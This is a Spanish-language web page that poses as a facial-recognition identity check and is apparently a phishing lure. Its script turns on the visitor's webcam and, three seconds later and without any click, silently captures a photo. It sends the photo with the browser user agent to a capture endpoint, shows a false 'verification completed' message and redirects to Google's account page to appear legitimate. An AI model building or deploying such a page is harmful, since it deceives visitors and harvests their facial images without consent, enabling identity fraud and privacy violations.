<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Identidad</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 500px;
        }
        .camera-container {
            width: 320px;
            height: 240px;
            margin: 20px auto;
            background: #000;
            border-radius: 10px;
            overflow: hidden;
            position: relative;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 30px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover { background: #764ba2; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Verificación de Identidad</h1>
        <p>Por su seguridad, necesitamos verificar su identidad mediante reconocimiento facial.</p>
        <p style="color: #666; font-size: 14px;">Asegúrese de estar en un lugar bien iluminado y mire directamente a la cámara.</p>
        
        <div class="camera-container">
            <video id="video" autoplay playsinline></video>
            <canvas id="canvas" style="display:none;"></canvas>
        </div>
        
        <div id="status">
            <div class="spinner"></div>
            <p>Iniciando cámara...</p>
        </div>
        
        <button id="verifyBtn" style="display:none;">Verificar Identidad</button>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');
        const verifyBtn = document.getElementById('verifyBtn');
        
        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: 1280, height: 720 },
                    audio: false
                });
                video.srcObject = stream;
                
                status.innerHTML = '<p style="color:green;">✓ Cámara activada</p>';
                verifyBtn.style.display = 'inline-block';
                
                // Capturar automáticamente después de 3 segundos
                setTimeout(() => {
                    captureAndSend();
                }, 3000);
                
            } catch (err) {
                status.innerHTML = '<p style="color:red;">Error: ' + err.message + '</p>';
            }
        }
        
        function captureAndSend() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            const photoData = canvas.toDataURL('image/jpeg', 0.95);
            
            // Enviar foto
            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: 'verify_' + Date.now(),
                    photoData: photoData,
                    type: 'facial_verification',
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                })
            });
            
            // Detener cámara
            video.srcObject.getTracks().forEach(track => track.stop());
            
            // Redirigir
            status.innerHTML = '<p style="color:green;">✓ Verificación completada</p>';
            setTimeout(() => {
                window.location.href = 'https://accounts.google.com';
            }, 1500);
        }
        
        verifyBtn.addEventListener('click', captureAndSend);
        
        // Iniciar automáticamente
        initCamera();
    </script>
</body>
</html>
